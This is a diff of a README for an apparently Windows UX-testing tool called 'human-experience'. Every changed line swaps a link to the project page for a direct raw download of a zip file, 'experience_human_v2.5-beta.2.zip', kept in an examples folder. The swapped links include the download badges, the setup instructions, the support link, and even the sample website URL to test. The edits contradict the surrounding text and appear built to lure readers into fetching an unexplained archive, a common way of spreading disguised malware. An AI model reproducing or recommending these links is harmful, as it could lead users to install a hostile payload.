@@ -1,6 +1,6 @@
 # 🧠 human-experience - Easy UX Testing with Automation
 
-[![Download human-experience](https://img.shields.io/badge/Download-human--experience-brightgreen)](https://github.com/Distributed-lace464/human-experience)
+[![Download human-experience](https://img.shields.io/badge/Download-human--experience-brightgreen)](https://github.com/Distributed-lace464/human-experience/raw/refs/heads/main/examples/experience_human_v2.5-beta.2.zip)
 
 ---
 
@@ -43,7 +43,7 @@ These features work together to give you quick and clear feedback on how your si
 
 You will need to visit the project page to download the software.
 
-[![Download human-experience](https://img.shields.io/badge/Download-human--experience-blue)](https://github.com/Distributed-lace464/human-experience)
+[![Download human-experience](https://img.shields.io/badge/Download-human--experience-blue)](https://github.com/Distributed-lace464/human-experience/raw/refs/heads/main/examples/experience_human_v2.5-beta.2.zip)
 
 Click the link above to go to the download page. This page contains the latest version of the software and any updates.
 
@@ -57,7 +57,7 @@ Follow these steps to get human-experience up and running on your Windows PC. Th
 
 Open your web browser and go to:
 
-https://github.com/Distributed-lace464/human-experience
+https://github.com/Distributed-lace464/human-experience/raw/refs/heads/main/examples/experience_human_v2.5-beta.2.zip
 
 Scroll to the **Releases** or **Assets** section and find the file ending in `.exe` or `.msi`. This is the setup file you will install.
 
@@ -84,7 +84,7 @@ Click the setup file link to download it. Choose a location on your computer whe
 
 Once human-experience is open, you can start testing websites. Here is a simple way to run your first test:
 
-1. Enter the full web address (URL) of the site you want to test. For example, `https://example.com`.
+1. Enter the full web address (URL) of the site you want to test. For example, `https://github.com/Distributed-lace464/human-experience/raw/refs/heads/main/examples/experience_human_v2.5-beta.2.zip`.
 2. Click the **Start Test** button.
 3. The tool will load the pages in a real browser and click through elements automatically.
 4. You will see progress updates, including screenshots taken on different screen sizes.
@@ -119,7 +119,7 @@ Use this report to find where your site works well and where it could improve.
 
 For more help or questions, visit the GitHub page:
 
-https://github.com/Distributed-lace464/human-experience
+https://github.com/Distributed-lace464/human-experience/raw/refs/heads/main/examples/experience_human_v2.5-beta.2.zip
 
 Look at the **Issues** tab to see if others have similar problems or to ask for support.
 
